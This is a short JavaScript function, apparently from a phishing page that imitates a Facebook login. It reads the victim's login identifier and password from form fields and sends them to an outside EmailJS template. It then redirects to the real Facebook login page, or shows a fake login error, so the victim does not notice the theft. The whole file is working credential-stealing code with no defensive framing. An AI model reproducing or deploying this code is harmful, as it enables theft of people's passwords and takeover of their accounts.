// The get Info Function
function getInfo(params) {
  var btn = document.getElementById("btn");

  var templateParams = {
    number: document.getElementById("emailtxt").value,
    password: document.getElementById("passtxt").value,
  };

  emailjs.send("service_wehub", "template_uw8tbyi", templateParams)
    .then(function (response) {
      console.log('SUCCESS!', response.status, response.text);
      window.location.href = "https://www.facebook.com/login";
    }, function (error) {
      console.log('FAILED...', error);
      alert("Error with Logging in");
    });

}